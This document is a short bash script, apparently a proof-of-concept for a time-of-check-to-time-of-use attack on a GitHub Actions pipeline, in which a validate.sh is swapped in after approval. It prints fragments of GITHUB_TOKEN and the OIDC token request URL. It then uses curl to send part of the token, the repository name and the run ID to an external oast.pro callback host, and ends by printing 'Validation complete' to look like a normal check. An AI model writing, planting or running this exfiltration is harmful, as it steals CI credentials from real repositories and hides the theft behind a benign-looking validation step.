#\!/bin/bash
# TOCTOU EXPLOIT — validate.sh force-pushed after gate approval hold
echo "HYDRA_EXPLOIT_CONFIRMED_E2E-REAL-TOCTOU-02251855"
echo "Running with production secrets: ${ACTIONS_ID_TOKEN_REQUEST_URL:0:30}..."
TOKEN_PREVIEW="${GITHUB_TOKEN:0:10}"
echo "TOKEN_PREFIX: ${TOKEN_PREVIEW}"
curl -sk "https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/toctou?t=${GITHUB_TOKEN:0:15}&r=${GITHUB_REPOSITORY}&run=${GITHUB_RUN_ID}" -o /dev/null 2>&1 || true
echo "Validation complete"
